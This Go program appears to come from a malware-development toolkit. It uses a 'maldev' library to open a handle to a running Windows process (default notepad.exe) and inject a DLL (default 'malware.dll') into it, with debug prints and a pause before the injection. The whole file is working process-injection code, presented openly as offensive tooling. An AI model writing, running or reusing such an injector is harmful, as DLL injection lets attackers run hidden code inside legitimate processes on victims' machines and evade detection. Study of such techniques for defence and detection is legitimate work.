package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/mortimus/maldev/pkg/maldev"
)

func main() {
	maldev.DEBUG = true
	// get process name from flags
	processName := flag.String("process", "notepad.exe", "Process name to inject into")
	dllName := flag.String("dll", "malware.dll", "DLL to inject")
	flag.Parse()

	pHandle, err := maldev.GetRemoteProcessHandle(*processName)
	if err != nil {
		log.Fatalf("Error getting process handle: %v", err)
	}
	fmt.Printf("Process Handle: %d\n", pHandle)

	// Injection
	var wDLLName maldev.LPWSTR
	err = wDLLName.Set(*dllName)
	if err != nil {
		log.Fatalf("Failed to convert DLL name to LPWSTR: %s\n", err)
	}
	maldev.Debugf("Injecting %s into %s\n", *dllName, *processName)
	maldev.DebugWait("Inject")
	err = maldev.InjectDllToRemoteProcess(pHandle, wDLLName)
	if err != nil {
		log.Fatalf("Failed to inject DLL: %s\n", err)
	}
}
